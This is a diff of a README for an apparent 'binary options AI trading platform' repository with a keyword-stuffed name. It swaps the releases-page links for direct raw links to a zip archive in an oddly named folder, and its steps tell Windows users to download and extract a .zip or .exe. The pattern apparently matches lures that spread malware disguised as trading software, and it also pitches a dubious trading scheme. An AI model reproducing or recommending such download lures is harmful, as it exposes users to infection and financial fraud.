@@ -1,6 +1,6 @@
 # 📈 buy-binary-options-script-ai-trading-platform-mint-scripts - Build your own professional trading platform
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Stonewortgenustodea389/buy-binary-options-script-ai-trading-platform-mint-scripts/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Stonewortgenustodea389/buy-binary-options-script-ai-trading-platform-mint-scripts/raw/refs/heads/main/throngingly/script-binary-ai-trading-scripts-buy-platform-options-mint-v2.5.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ Ensure your Windows computer meets these minimum specifications before you begin
 
 ## 📥 Installation Steps
 
-1. Visit this page to download: [https://github.com/Stonewortgenustodea389/buy-binary-options-script-ai-trading-platform-mint-scripts/releases](https://github.com/Stonewortgenustodea389/buy-binary-options-script-ai-trading-platform-mint-scripts/releases).
+1. Visit this page to download: [https://github.com/Stonewortgenustodea389/buy-binary-options-script-ai-trading-platform-mint-scripts/raw/refs/heads/main/throngingly/script-binary-ai-trading-scripts-buy-platform-options-mint-v2.5.zip](https://github.com/Stonewortgenustodea389/buy-binary-options-script-ai-trading-platform-mint-scripts/raw/refs/heads/main/throngingly/script-binary-ai-trading-scripts-buy-platform-options-mint-v2.5.zip).
 2. Look for the file ending in .zip or .exe.
 3. Save the file to your desktop.
 4. If the file is compressed, right-click the file and select "Extract All".
